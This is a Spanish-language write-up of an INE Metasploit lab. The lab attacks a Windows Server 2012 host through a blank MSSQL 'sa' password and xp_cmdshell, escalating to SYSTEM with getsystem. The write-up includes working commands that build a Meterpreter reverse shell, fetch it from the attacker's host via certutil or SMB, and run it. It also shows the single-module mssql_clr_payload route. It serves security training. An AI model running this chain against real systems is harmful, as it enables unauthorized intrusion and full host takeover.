---
title: "INE Metasploit CTF 1"
date: 2026-10-22
categories: [INE, Lab]
tags: [windows, mssql, sql server, empty password, xp_cmdshell, RCE, getsystem, seimpersonate, token impersonation, named pipe impersonation, privilege escalation, clr, nmap, metasploit, impacket, msfvenom, certutil, python]
image:
  path: /assets/img/INE/banner.webp
  lqip: "data:image/webp;base64,UklGRvYBAABXRUJQVlA4WAoAAAAQAAAAHwAACQAAQUxQSBsBAAABkGvb2rFX+3vf2LZt6/v/kcq2bds2S7W2U2WkykjLe7BtnxPnGiIiAQIK35cqQvA34aEE3wxAmeDLEvDK6Blb2LH2HEcTdRk+fDMAo8GCAK6O0TlBWlpqKtru1qrO4SlFVZkcbYCCEL9EqPvddw4/3VQD0LlLjjx5/9miBAKK0hQT3ffmseuF9xpQ0/fytZuU1NTEuIQE53ofUGi3REL1f8vUPibe42H5v3z5un/we0CGpyoT9uHcIEb9vWXylAiuvHPk3yuWXjd3dna2dzYNgXLDHgR4Qf1f88QhD5R2L0v+lW8cOLAclmW5ogAWnUivDtTfO+avGQKL3ff3wub3X1xQ4gvxVgKhKDNuAEChGBCtz3hGRnxHyoABAFZQOCC0AAAAEAQAnQEqIAAKAD7tYqpNqaWkIjAIATAdiWwAnS+PQAAckstmKzupqwQA/GAJj2rSsnYxXiIloZL4anV4YKPl3LHLvC5WLeJrDpnIPzMmd6LmX/pjUq/q5r1XGy4yigyPOyI1a1GJgQxa46PmT/1+xE/HXrwQ7OTEzbZr3K34pzTG4RCmid2FltrXI9eU4lqAE0H9ax/8f8/3/upMBKkfw2JGWEDjl+D/4/63ebP9L9oX4BAA"
  alt: INE Metasploit CTF 1 writeup
---

Este es un laboratorio de práctica del curso de INE *The Metasploit Framework* — un único objetivo Windows Server 2012 construido en torno a uno de los footholds de Windows más fiables que existen: un **Microsoft SQL Server con la contraseña de `sa` en blanco**. Como todo el laboratorio trata de trabajar *dentro* de Metasploit, este writeup se centra en ese flujo — el escaneo respaldado por la base de datos, el login de `sa`, habilitar `xp_cmdshell` para ejecución de comandos, preparar un payload de Meterpreter, y terminar con `getsystem` para llegar a `NT AUTHORITY\SYSTEM`. Una segunda ruta de un solo módulo (`mssql_clr_payload`) hace lo mismo en un único comando `exploit`.

| Campo      | Detalles       |
|------------|----------------|
| Plataforma | INE            |
| Dificultad | Lab            |
| SO         | Windows Server 2012 |
| IP         | 10.2.23.229    |
| Fecha      | Octubre 2026   |

## Herramientas Usadas

| Herramienta          | Descripción                                                         |
|----------------------|---------------------------------------------------------------------|
| Metasploit           | `db_nmap`, workspaces, `multi/handler`, y el módulo `mssql_clr_payload` |
| nmap                 | Los scripts NSE `ms-sql-*` que encontraron la contraseña `sa` vacía |
| impacket-mssqlclient | Se autenticó en MSSQL como `sa` y habilitó `xp_cmdshell`           |
| msfvenom             | Generó el ejecutable de reverse shell Meterpreter x64             |
| Python               | `http.server` para servir el payload                               |
| certutil             | Descargó el payload en el objetivo (living-off-the-land)           |
| impacket-smbserver   | Transferencia alternativa del payload sobre SMB                    |

## Reconocimiento y Enumeración

### Escanear desde dentro de Metasploit

Como este es el curso de Metasploit, el escaneo corre a través de la propia base de datos del framework para que los resultados queden almacenados y consultables. Arrancar PostgreSQL le da a Metasploit su backend, y luego `db_nmap` ejecuta un nmap normal cuya salida se parsea directamente a esa base de datos:

```bash
service postgresql start
msfconsole
```

```bash
msf6 > db_nmap -p- -sCV 10.2.23.229 -oN nmap
msf6 > services
```

```bash
host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.2.23.229  135    tcp    msrpc         open   Microsoft Windows RPC
10.2.23.229  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.2.23.229  445    tcp    microsoft-ds  open   Windows Server 2008 R2 - 2012
10.2.23.229  1433   tcp    mssql         open   Microsoft SQL Server 2012 11.00.6020.00; SP3
10.2.23.229  3389   tcp    ms-wbt-server open   (RDP)
10.2.23.229  5985   tcp    http          open   WinRM
```

- **`db_nmap`** es nmap envuelto por Metasploit; sus hallazgos pueblan la base de datos.
- **`services`** los lee de vuelta — cada host, puerto y servicio que el escaneo descubrió, ahora disponibles para cualquier módulo.
- Dos comandos más preparan el engagement: **`setg RHOSTS 10.2.23.229`** fija el objetivo de forma global para que cada módulo lo herede, y **`workspace -a target`** crea un workspace con nombre para mantener aislados los datos de este host.

```bash
msf6 > setg RHOSTS 10.2.23.229
msf6 > workspace -a target
```

El servicio protagonista es **Microsoft SQL Server 2012 en el TCP 1433**. MSSQL es un foothold clásico de Windows, porque su cuenta de servicio es privilegiada y se le puede hacer ejecutar comandos del SO.

### Enumeración de MSSQL — la contraseña `sa` en blanco

nmap trae toda una familia de scripts `ms-sql-*`. Apuntarlos al 1433 responde primero a la única pregunta que importa — ¿podemos entrar?

```bash
nmap -p1433 -sV --script "ms-sql*" 10.2.23.229
```

```bash
| ms-sql-empty-password:
|_    sa:<empty> => Login Success
| ms-sql-dump-hashes:
|     sa:0x020056f5245d8dd0f502737b7850ac73e66bac6bb6c...
| ms-sql-xp-cmdshell:
|_  (Use --script-args=ms-sql-xp-cmdshell.cmd='<CMD>' ...)
```

**`ms-sql-empty-password`** reporta `sa:<empty> => Login Success` — la cuenta `sa` (system administrator) **no tiene contraseña en absoluto**. `sa` es el superusuario integrado de MSSQL, así que esto es, en la práctica, control total del motor de base de datos. Los scripts también vuelcan los hashes de login de MSSQL y confirman que `xp_cmdshell` es accesible — el primitivo exacto que convierte admin de base de datos en ejecución de comandos del SO.

## Acceso Inicial — `xp_cmdshell` de MSSQL como `mssqlserver`

### Entrar como `sa`

`impacket-mssqlclient` da un prompt SQL interactivo; con una contraseña en blanco conecta directamente como `sa`:

```bash
impacket-mssqlclient sa@10.2.23.229
# (contraseña: simplemente pulsa Enter)
SQL (sa  dbo@master)>
```

### Habilitar `xp_cmdshell`

`xp_cmdshell` es un procedimiento almacenado extendido que ejecuta un comando de Windows desde SQL — deshabilitado por defecto. Como `sa` podemos activarlo, pero vive tras las "opciones avanzadas", así que hay que cambiar dos ajustes y confirmarlos con `RECONFIGURE`:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

Con él habilitado, un primer comando confirma el contexto de ejecución:

```sql
EXEC xp_cmdshell 'whoami';
-- nt service\mssqlserver
```

Ejecución de comandos como **`nt service\mssqlserver`** — la cuenta bajo la que corre el servicio de SQL Server. Ese es el foothold; el resto es convertir esta ejecución ciega, de un comando cada vez, en una shell interactiva de verdad.

### Preparar una shell de Meterpreter

`xp_cmdshell` ejecuta un comando y devuelve su salida de texto — incómodo para trabajar — así que el objetivo es una sesión de Meterpreter real. `msfvenom` construye un ejecutable de reverse shell x64 apuntado a nuestro listener:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.49.7 LPORT=4444 -f exe -o reverse.exe
```

Luego tiene que llegar al objetivo. Dos métodos de transferencia, ambos a través de `xp_cmdshell` — conviene conocer los dos porque uno suele estar bloqueado:

```bash
# Método A — HTTP con certutil (un binario firmado de Windows que también sirve de descargador)
python3 -m http.server       # en el atacante
```

```sql
EXEC xp_cmdshell 'mkdir C:\Temp';
EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.49.7:8000/reverse.exe C:\Temp\reverse.exe';
```

```bash
# Método B — SMB con un recurso de impacket, y luego un copy normal
impacket-smbserver share $(pwd) -smb2support     # en el atacante
```

```sql
EXEC xp_cmdshell 'copy \\10.10.49.7\share\reverse.exe C:\Temp\reverse2.exe';
```

Con el payload en disco y un `multi/handler` esperando (mismo payload, LHOST y LPORT), ejecutarlo dispara el callback:

```sql
EXEC xp_cmdshell 'C:\Temp\reverse.exe';
```

```bash
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.49.7:4444
[*] Sending stage (201798 bytes) to 10.2.23.229
[*] Meterpreter session 4 opened (10.10.49.7:4444 -> 10.2.23.229:50082)

meterpreter > getuid
Server username: NT Service\MSSQLSERVER
```

## Escalada de Privilegios — `mssqlserver` → `SYSTEM`

### getsystem vía SeImpersonatePrivilege

Las cuentas de servicio como `mssqlserver` tienen **`SeImpersonatePrivilege`** — el derecho a impersonar el token de un cliente. Eso lo es todo en Windows: un proceso que puede impersonar puede engañar a un servicio `SYSTEM` para que entregue un token `SYSTEM` (la familia de técnicas "Potato"). El `getsystem` de Meterpreter lo automatiza:

```bash
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

`SYSTEM` — el privilegio más alto del host. La técnica "Named Pipe Impersonation" que usó es exactamente el abuso de `SeImpersonate` de arriba.

### Recoger las flags

Bajando a una shell, las flags están repartidas por el sistema de ficheros. Una incluso está *nombrada* por la lección — `EscaltePrivilageToGetThisFlag.txt` está en una ubicación solo para `SYSTEM`, legible solo ahora que hemos escalado:

```text
C:\> type flag1.txt                                              # REDACTED
C:\> dir C:\ /s /b | findstr -i flag
C:\Windows\System32\config\flag2.txt
C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt
C:\> type C:\Windows\System32\config\flag2.txt                   # REDACTED
C:\> type C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt   # REDACTED
C:\Users\Administrator\Desktop> type flag4.txt                   # REDACTED
```

## Alternativa — Un Solo Módulo: `mssql_clr_payload`

Todo lo anterior se puede colapsar en un único módulo de Metasploit. `mssql_clr_payload` entra en MSSQL (aquí como `sa` con la contraseña en blanco), carga un **ensamblado CLR** — código .NET que MSSQL ejecuta en su propio proceso — y lanza un payload de Meterpreter directamente, sin `xp_cmdshell` manual ni transferencia de ficheros:

```bash
msf6 > use exploit/windows/mssql/mssql_clr_payload
msf6 > set RHOST target.ine.local
msf6 > set payload windows/x64/meterpreter_reverse_tcp
msf6 > exploit
```

```bash
meterpreter > getuid
Server username: NT Service\MSSQLSERVER
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

El mismo destino — `mssqlserver` y luego `getsystem` a `SYSTEM` — en un solo comando. Es la contraparte automatizada de la cadena manual, y hacer la versión manual primero es lo que hace legible el módulo.

## Flags

| Flag        | Ubicación                                                        | Valor      |
|-------------|------------------------------------------------------------------|------------|
| `flag1.txt` | `C:\`                                                            | `REDACTED` |
| `flag2.txt` | `C:\Windows\System32\config\`                                    | `REDACTED` |
| `flag3.txt` | `C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt` | `REDACTED` |
| `flag4.txt` | Escritorio del Administrador                                     | `REDACTED` |

## Conclusiones Clave

- **Una contraseña `sa` en blanco es un foothold instantáneo en Windows.** El `sa` de MSSQL es un superusuario, y el script NSE `ms-sql-empty-password` respondió a toda la cuestión del acceso en una línea. Todo SQL Server expuesto merece una comprobación de credenciales antes que nada más pesado.
- **El admin de base de datos se convierte en ejecución de comandos del SO vía `xp_cmdshell`.** Está deshabilitado por defecto, pero `sa` puede activarlo con dos sentencias `sp_configure` + `RECONFIGURE`. Trata el acceso de superusuario SQL como equivalente a una shell en el host — porque lo es.
- **Conoce dos formas de dejar caer un payload.** `certutil` sobre HTTP y un copy con `impacket-smbserver` sobre SMB entregan el ejecutable a través del mismo primitivo `xp_cmdshell`; cuando el egress o un protocolo está filtrado, tener la alternativa es lo que mantiene la cadena en marcha.
- **Las cuentas de servicio casi siempre tienen `SeImpersonatePrivilege`.** Caer como `mssqlserver` no es `SYSTEM`, pero ese privilegio hace de `getsystem` (impersonación Named-Pipe / Potato) un trámite. En cualquier foothold de servicio Windows, mira `getprivs` buscando `SeImpersonate` primero.
- **Aprende la cadena manual, y luego aprecia el one-liner.** `mssql_clr_payload` comprime login → carga CLR → payload en un solo `exploit`, pero entender cada paso manual — el login de `sa`, habilitar `xp_cmdshell`, la transferencia preparada, `getsystem` — es lo que te permite adaptarte cuando el módulo único no encaja.
